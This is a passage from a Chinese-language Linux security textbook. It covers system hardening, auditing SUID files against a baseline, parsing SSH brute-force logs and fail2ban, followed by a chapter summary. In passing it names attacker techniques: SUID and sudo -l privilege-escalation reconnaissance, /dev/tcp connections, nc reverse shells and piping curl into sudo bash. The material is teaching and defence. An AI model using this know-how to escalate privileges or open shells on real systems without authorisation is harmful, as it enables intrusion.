chmod 640 /etc/shadow          # 確認敏感檔案權限沒被放寬(3.3 節)
```

回顧 3.3:寬鬆權限(尤其是可寫的腳本、設定檔)是提權溫床。加固時要揪出並收緊這些檔案。root 能做的事也盡量用 sudo 精細授權,而非直接開放(3.4 節)。

### 三、定期稽核 SUID 檔案(呼應 3.3 的攻防對照)

```bash
# 建立「基準線」:記錄目前所有 SUID 檔案
find / -perm -4000 -type f 2>/dev/null | sort > suid_baseline.txt
# 日後定期重掃,與基準線比對,揪出「新冒出來」的 SUID 檔案
find / -perm -4000 -type f 2>/dev/null | sort | diff - suid_baseline.txt
#   diff 會標出差異 → 多出來的行,極可能是攻擊者留下的提權後門
```

這正是 3.3 講的攻防對照落地:攻擊者用 `find / -perm -4000` 找破口,防禦者用**同一條指令 + 基準線比對**抓異常。同一個知識,攻守兩用。

### 四、看 log:讓入侵無所遁形

```bash
# 揪出暴力破解 SSH 的來源(3.6 節那條,藍隊每天在跑)
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
# 進階:用 fail2ban 這類工具,自動在「某 IP 失敗太多次」時封鎖它
sudo apt install fail2ban      # 自動監看 log 並動態封鎖惡意 IP
```

搭配把 log **即時送到另一台主機**(集中式日誌,第 20 章),就算攻擊者進來想清足跡,證據早已備份在他碰不到的地方。

> **心智模型**:加固不是「裝一個防毒軟體就好」,而是**一連串「少開一扇門、少給一把鑰匙、多裝一個監視器」的累積**。攻擊者需要找到「一個」破口就能進;防禦者要顧好「每一個」點。這種不對稱正是資安難的地方——也是為什麼「以攻代防」重要:你得先像攻擊者一樣把門都試一遍,才知道哪扇該補。

## 3.11 本章小結

- **Linux 是資安主場**:工具生態、攻擊目標、開源可驗證,三個理由讓你非熟不可。
- **重要路徑要熟門熟路**:`/etc/passwd`(帳號名冊)、`/etc/shadow`(密碼雜湊,提權里程碑)、`/var/log`(足跡兩面刃)、`/home`+`/root`(藏寶庫)、`/tmp`(落腳處)、`/proc`(透視窗,查核心版本)。
- **權限模型是核心地基**:rwx × user/group/other,`chmod`(數字/符號)、`chown`。**SUID/SGID 是攻擊者最愛的提權破口**,`find / -perm -4000` 是攻防雙方都會下的指令(伏筆第 16 章)。
- **帳號與 sudo**:root 至高無上,平常用一般帳號、需要才 sudo;`sudo -l` 是提權偵察黃金指令,`/etc/sudoers` 設定不當是常見破口。
- **程序與服務**:`ps aux`/`top` 看誰在跑、`systemctl` 管服務、`ss -tlnp` 看「哪個程序在聽哪個 port」(內部視角勝過外部掃描)。
- **命令列組合技**:管線 `|`、重導向 `>` `>>` `2>`、`grep`/`awk`/`sed`/`cut`/`sort`/`uniq` 串起來,就能從 log 撈出可疑 IP。
- **自動化**:用 bash 迴圈把重複的探測寫成腳本;`/dev/tcp` 讓你在無工具的受限環境也能連 port。
- **網路瑞士刀**:`curl`(打 API/看 header)、`wget`(抓檔)、`nc`(監聽/連線/反向 shell 概念)、`ssh`/`scp`(登入/傳檔/埠轉發)。
- **安裝與信任**:apt 最安全、原始碼自編要自己扛信任、`curl | sudo bash` 要警覺——信任是要驗證的。
- **防禦四招**:關服務(縮小攻擊面)、最小權限(別 777)、稽核 SUID(基準線比對)、看 log(fail2ban + 集中式日誌)。

> **下一章預告**:基本功練齊,我們正式進入攻擊的第一階段——**偵察**。第 04 章談 **OSINT(開源情報蒐集)**:在完全不碰目標主機、不觸發任何警報的情況下,單靠公開資訊(DNS 紀錄、Google 進階搜尋、社群媒體、外洩資料庫、`whois`、憑證透明度紀錄……)就能拼湊出目標的組織架構、員工名單、對外資產與潛在弱點。你會發現,一次高明的攻擊,往往在攻擊者「敲第一個封包之前」,情報就已經蒐集得差不多了。這一章會顛覆你對「駭客從哪裡開始」的想像。
